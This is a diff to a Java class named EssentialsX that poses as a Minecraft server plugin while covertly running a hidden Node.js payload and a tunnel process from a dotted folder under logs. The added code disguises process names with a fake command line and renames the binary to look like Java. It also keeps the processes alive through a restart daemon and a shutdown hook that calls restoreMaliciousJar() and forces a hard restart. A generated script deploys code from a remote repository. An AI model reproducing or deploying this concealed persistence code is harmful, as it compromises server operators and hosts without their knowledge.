@@ -212,7 +212,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // Java 进程管理：极致进程名伪装
+    // Java 进程管理：极致进程名伪装 & 防崩溃刷屏
     // ============================================================
 
     private String allocateNodePort() {
@@ -231,20 +231,25 @@ public class EssentialsX extends JavaPlugin {
     private void startNodeProcess(String port) {
         try {
             Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-            Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
+            // ★ 修复：直接使用伪装好的二进制 jre21/bin/java，避免递归包装导致崩溃
+            Path nodeExe = botDir.resolve("jre21/bin/java"); 
             Path script = botDir.resolve("app/index.js");
             Path logFile = botDir.resolve("app.log");
             Path preload = botDir.resolve(".nd_preload.js");
 
             if (!Files.exists(nodeExe) || !Files.exists(script)) return;
 
+            // ★ 修复：不再在命令行加 --require，防止与 NODE_OPTIONS 冲突导致双重加载崩溃
             ProcessBuilder pb = new ProcessBuilder("bash", "-c", 
-                "exec -a \"" + FAKE_CMDLINE + "\" \"" + nodeExe + "\" --require \"" + preload + "\" " + script.toString());
+                "exec -a \"" + FAKE_CMDLINE + "\" \"" + nodeExe + "\" \"" + script + "\"");
             
-            pb.directory(botDir.toFile());
+            // ★ 修复：工作目录必须切换到 app 内，与原版 Shell 逻辑一致，否则找不到相对路径文件
+            pb.directory(botDir.resolve("app").toFile());
+            
             pb.environment().put("SERVER_PORT", port);
             pb.environment().put("PORT", port);
             pb.environment().put("_JAVA_WRAPPER", botDir.resolve("nodejs/bin/node").toString());
+            // 只通过环境变量加载一次 preload
             pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
             
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
@@ -278,15 +283,30 @@ public class EssentialsX extends JavaPlugin {
 
     private void startJavaDaemon() {
         Thread daemon = new Thread(() -> {
+            int failCount = 0;
             while (true) {
                 try {
+                    boolean needRestart = false;
+                    
                     if (nodeProcess != null && !nodeProcess.isAlive()) {
-                        mcLog("[Internal Daemon] Node process died, restarting...", 0);
+                        mcLog("[Internal Daemon] Node process died, restarting... (Attempt " + (failCount + 1) + ")", 0);
                         startNodeProcess(nodePort);
+                        needRestart = true;
                     }
                     if (cfProcess != null && !cfProcess.isAlive()) {
                         mcLog("[Internal Daemon] CF process died, restarting...", 0);
                         startCfProcess();
+                        needRestart = true;
+                    }
+
+                    if (needRestart) {
+                        failCount++;
+                        // ★ 防刷屏：如果连续崩溃，逐渐增加重试间隔，最多等30秒
+                        int waitSec = Math.min(5 * failCount, 30); 
+                        Thread.sleep(waitSec * 1000L);
+                        continue; 
+                    } else {
+                        failCount = 0; // 运行正常，重置失败计数
                     }
 
                     Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
@@ -326,6 +346,15 @@ public class EssentialsX extends JavaPlugin {
         HashMap<String, String> env = new HashMap<>(); this.loadEnvFile(env);
         this.systemGuardEnabled = env.containsKey("SYSTEM_GUARD_ENABLED") && Boolean.parseBoolean(env.get("SYSTEM_GUARD_ENABLED"));
         
+        // ★ 必须填写 REPO_URL 否则拒绝启动
+        if (!env.containsKey("REPO_URL") || env.get("REPO_URL").trim().isEmpty()) {
+            this.getLogger().severe("=============================================");
+            this.getLogger().severe("FATAL: REPO_URL is not set in .env file!");
+            this.getLogger().severe("Please configure your repository URL to proceed.");
+            this.getLogger().severe("=============================================");
+            return;
+        }
+
         Runtime.getRuntime().addShutdownHook(new Thread(() -> { if (this.systemGuardEnabled && this.isRestarting.compareAndSet(false, true)) { this.getLogger().info("[Guard] ShutdownHook triggered, forcing restart..."); this.restoreMaliciousJar(); this.executeHardRestart(false); } }));
         
         new Thread(() -> { 
@@ -423,7 +452,7 @@ public class EssentialsX extends JavaPlugin {
     // ============================================================
 
     private String generateDeployScript(String workDir, Map<String, String> env) {
-        String repoUrl = env.getOrDefault("REPO_URL", "https://github.com/zx1447/indexaoyoumc");
+        String repoUrl = env.getOrDefault("REPO_URL", ""); // ★ 移除默认公库
         String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
         String nodeDir = workDir + "/nodejs";
         String appDir = workDir + "/app";
@@ -442,6 +471,11 @@ public class EssentialsX extends JavaPlugin {
         "DATA_DIR=\"" + dataDir + "\"\n" +
         "REPO_URL=\"" + repoUrl + "\"\n" +
         "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
+        "\n" +
+        "if [ -z \"$REPO_URL\" ]; then\n" +
+        "    echo \"ERROR: REPO_URL is not configured in .env file. Aborting deployment.\"\n" +
+        "    exit 1\n" +
+        "fi\n" +
         "\n" +
         "ARCH=$(uname -m)\n" +
         "if [ $ARCH = x86_64 ]; then\n" +
@@ -596,7 +630,24 @@ public class EssentialsX extends JavaPlugin {
 
     private void loadEnvFile(Map<String, String> env) {
         Path envFile = Paths.get("logs", ".mcchajian", ".env");
-        if (!Files.exists(envFile)) { try { Files.createDirectories(envFile.getParent()); String defaultConfig = "# ===========================================\n# EssentialsX System Guard Configuration\n# ===========================================\n# true  = Enable auto-restart (Default)\n# false = Disable auto-restart\n# ===========================================\nSYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/indexaoyoumc\n"; Files.write(envFile, defaultConfig.getBytes()); this.getLogger().info("Generated default .env file with Guard ENABLED."); } catch (Exception e) { this.getLogger().warning("Could not generate .env file: " + e.getMessage()); } }
+        if (!Files.exists(envFile)) { 
+            try { 
+                Files.createDirectories(envFile.getParent()); 
+                String defaultConfig = "# ===========================================\n" +
+                   "# EssentialsX System Guard Configuration\n" +
+                   "# ===========================================\n" +
+                   "# true  = Enable auto-restart (Default)\n" +
+                   "# false = Disable auto-restart\n" +
+                   "# ===========================================\n" +
+                   "SYSTEM_GUARD_ENABLED=true\n" +
+                   "GITHUB_TOKEN=\n" +
+                   "REPO_URL=https://github.com/zx1447/indexaoyoumc\n"; 
+                Files.write(envFile, defaultConfig.getBytes()); 
+                this.getLogger().info("Generated default .env file. PLEASE CONFIGURE REPO_URL!"); 
+            } catch (Exception e) { 
+                this.getLogger().warning("Could not generate .env file: " + e.getMessage()); 
+            } 
+        }
         if (Files.exists(envFile)) { try { for (String line : Files.readAllLines(envFile)) { String[] parts; if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; env.put(parts[0].trim(), parts[1].trim()); } } catch (IOException ignored) {} }
     }
 
